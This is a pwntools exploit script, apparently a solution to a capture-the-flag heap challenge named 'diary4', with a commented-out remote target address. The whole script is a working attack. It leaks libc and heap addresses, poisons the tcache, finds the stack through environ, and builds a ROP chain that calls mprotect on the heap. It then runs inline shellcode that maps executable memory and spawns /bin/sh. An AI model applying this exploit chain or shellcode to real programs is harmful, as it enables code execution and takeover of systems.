from pwn import *
# -*- coding: utf-8 -*-

exe = context.binary = ELF('./diary4')
libc = ELF('./libc.so.6')


p = process("./diary4",env={"LD_PRELOAD":"libc.so.6"})
#p = remote("139.59.183.166",32584)
index = 1
def wait(inp):
    a = raw_input(inp)

def add_page(content, to_traverse, calloc=False):
    global index
    p.sendlineafter("choice: ", "1")
    p.sendlineafter("choice: ", "2" if calloc else "1")
    response = p.recv(5)
    print(response)
    if b"pages" == response:
        p.sendline(str(abs(to_traverse)))
        p.sendlineafter("right or left: ", "left" if to_traverse < 0 else "right")
        index = index + to_traverse
#    print(p.recv(5))
    p.sendlineafter("data for the page", content)

def delete_page(to_traverse):
    p.sendlineafter("choice: ", "2")
    p.sendlineafter("pages to traverse: ", str(abs(to_traverse)))
    p.sendlineafter("right or left: ", "left" if to_traverse < 0 else "right")

def dump():
   p.sendlineafter("choice: ", "4")
   log.info("Waiting")
   print(p.recvuntil(": \n"))
   log.info("waiting until W..")
   return p.recvuntil("W", drop=True)

def edit(content):
  p.sendlineafter("choice: ", "5")
  p.sendlineafter("input data for the page: ", content)

add_page("b", 0,calloc=True)
for i in range(8):
 add_page("a", 0,calloc=True)
#wait("/wrote 10 pages")
for i in range(7):
 delete_page(0)
#wait("Free'd 7 pages")
delete_page(1)
delete_page(1)
#wait("Deleted 2 pages")

print(str(index))
#add_page("B", 0, calloc=False)
for i in range(7): # clear tcache
 add_page("A", 0, calloc=False)
#wait("Allocated 7 pages")

add_page("", 0, calloc=False)
#wait("Added another page")
libc_leak = u64((dump()[:6]+"\x00\x00")[:8])
libc.address = libc_leak - 0x1bf00a 
log.info("Libc leak @ " + hex(libc_leak))
delete_page(0)
add_page("A" * 8,0)
heap_leak = u64((dump()[:14][8:14] + "\x00\x00")[:8])
heap = heap_leak - 0x150a
log.info("Heap leak @ " + hex(heap_leak))
log.info("Heap @ " + hex(heap))
wait("Freeing 7 chunks")
for i in range(7):
  delete_page(0)

wait("Sending scanf trick")
p.send("1"*0x1000)
p.sendline()
wait("freeing a chunk")
p.recvuntil("choice: ")
delete_page(1)
p.recvuntil("choice: ")
wait("scanf trick again")
p.send("1"*0x1000)
p.sendline()

tcache_idx = heap + 0x210 # a bit before tcache idx
sleep(0.5)
wait("Editing chunk")
log.info("Victim @ "  + hex(tcache_idx))
edit(p64(tcache_idx - 0x10))
wait("Mallocing to clear tcachebins")
add_page("BABA", 0)


"""
rax 9, rbx deadbeef, rcx 0x1000, edx 7, esi 0x40

mov eax, 9
mov rdi, 0xdeadb000
mov rsi, 0x1000
mov rdx, 7
mov r10, 0x22
xor r8,r8
xor r9,r9
syscall
mov r8, 0xdeadb000
mov r9, 0x68732f6e69622f
mov [r8],r9
mov ebx, 0xdeadb000
mov ecx, 0 
mov edx, 0
mov eax, 0xb
int 0x80

mmap(0xdeadbeef,0x1000,7,0x22)
  void* addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);

"""



shellcode = "\x90" * 8 + "\xB8\x09\x00\x00\x00\x48\xBF\x00\xB0\xAD\xDE\x00\x00\x00\x00\x48\xC7\xC6\x00\x10\x00\x00\x48\xC7\xC2\x07\x00\x00\x00\x49\xC7\xC2\x22\x00\x00\x00\x4D\x31\xC0\x4D\x31\xC9\x0F\x05\x49\xB8\x00\xB0\xAD\xDE\x00\x00\x00\x00\x49\xB9\x2F\x62\x69\x6E\x2F\x73\x68\x00\x4D\x89\x08\xBB\x00\xB0\xAD\xDE\xB9\x00\x00\x00\x00\xBA\x00\x00\x00\x00\xB8\x0B\x00\x00\x00\xCD\x80"
add_page(shellcode,0)
wait("Stashing attack")
add_page("B", 0, calloc=True)
wait("tcache_idx -> tcache_idx - 0x20")
add_page(p64(tcache_idx - 0x30),0)
wait("Making tcache_idx writable and setting it to environ @ " + hex(libc.symbols['environ'] - 0x10))
add_page("A" * 40 + p64(2) + p64(libc.symbols['environ']-0x10) + "C" * 8,0)
add_page("B" * 7,0)
leak = dump()
#context.log_level = "debug"
environ = u64((leak.split("\n")[1] + "\x00\x00\x00\x00")[:8])
log.info("Environ @ " + hex(environ))
ret = (environ - 0x140) -8
log.info("Switch to the chunk that has access to tcache_idx")
p.interactive() # go 2 to the left and hit ctrl d
p.sendline("11")
wait("Editing tcache_idx -> ret @ " + hex(ret))
edit(p64(ret))
popr13_jmprax = 0x000000000007667f #
poprdi_ret = 0x0000000000027b26 
poprsi_ret = 0x000000000003268a
poprdx_ret = 0x0000000000089912
int80 = 0x000000000011f7f2
poprax_ret = 0x000000000003fda0
poprcx_poprbx_ret = 0x00000000000e450e
jmp_rax = 0x0000000000061ac3
# eax -> 0xb
# ebx -> */bin/sh
# ecx -> 0
# edx -> 0 
rop = p64(libc.address + poprdi_ret) + p64(heap)
rop += p64(libc.address + poprsi_ret) + p64(0x10000)
rop += p64(libc.address + poprdx_ret) + p64(7)
rop += p64(libc.symbols['mprotect'])
rop += p64(libc.address + poprax_ret) + p64(heap + 0x2b0)
rop += p64(libc.address + jmp_rax)
wait("Break on " + hex(libc.address + jmp_rax))

add_page(rop,0)
p.interactive()


dump()

